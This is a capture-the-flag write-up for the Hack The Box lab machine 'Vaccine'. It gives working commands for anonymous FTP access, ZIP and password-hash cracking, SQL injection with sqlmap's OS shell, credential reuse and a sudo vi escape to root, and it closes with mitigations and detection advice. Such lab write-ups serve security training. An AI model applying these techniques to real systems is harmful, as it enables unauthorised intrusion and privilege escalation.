---
machine: Vaccine
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, sqli, postgresql, sudo, tier2]
---

# Vaccine — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

Anonymous FTP hands over `backup.zip`; crack the ZIP, find the administrator hash inside, log in, and the dashboard search is injectable. `sqlmap --os-shell` gives a shell as `postgres`, and `sudo vi` on `pg_hba.conf` escalates to root.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
21/tcp ftp     vsftpd 3.0.3
22/tcp ssh     OpenSSH 8.0p1 Ubuntu
80/tcp http    Apache httpd 2.4.41 (Ubuntu)
```

## Enumeration

```bash
ftp <TARGET_IP>          # anonymous / <Enter>
ftp> get backup.zip
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
unzip backup.zip
```

Inside: `index.php` with the administrator's MD5 hash and the login logic. Crack it with rockyou and sign in.

## Foothold

The dashboard search concatenates the term into a PostgreSQL query (`ILIKE`). Confirm with a quote, then automate:

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<SESSION>" --os-shell --batch
```

```text
os-shell> id
uid=33(www-data) ...
```

Launch a reverse shell from `--os-shell` (do not escalate inside it) and land as `www-data`.

## Lateral movement

```bash
cat /var/www/html/index.php
```

The source reveals `postgres` credentials (`P@s5w0rd!`), reused on the system:

```bash
su postgres
```

## Privilege escalation

```bash
sudo -l
# (root) /bin/vi /etc/postgresql/11/main/pg_hba.conf
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi`:

```text
:set shell=/bin/sh
:shell
```

```text
# id
uid=0(root)
# cat /root/flag.txt
```

## Evidence

- `backup.zip` and its hash (redacted).
- `sudo -l` with the `vi` rule and `id` as root.

## Lessons learned

- A password-protected ZIP protects nothing when its hash is crackable.
- Source code from the backup reveals both the hash and the SQLi logic.
- `--os-shell` is for the foothold, not for escalation: break out to a real shell.
- Any editor runnable via `sudo` is root (`vi`, `vim`, `nano -e`).

## Mitigations and detection

- Anonymous FTP disabled; encrypted backups kept out of public reach.
- Passwords with `password_hash()` (bcrypt/argon2), never MD5.
- Parameterised queries and a least-privilege DB user.
- `sudo` limited to non-interactive commands; never editors.
- Detection: `sqlmap` in logs (UA and payloads), `sudo vi` in `auth.log`, `sh` children of `vi`.

- CWE-89, CWE-916, CWE-250
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/)

## References

- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [sqlmap — os-shell](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
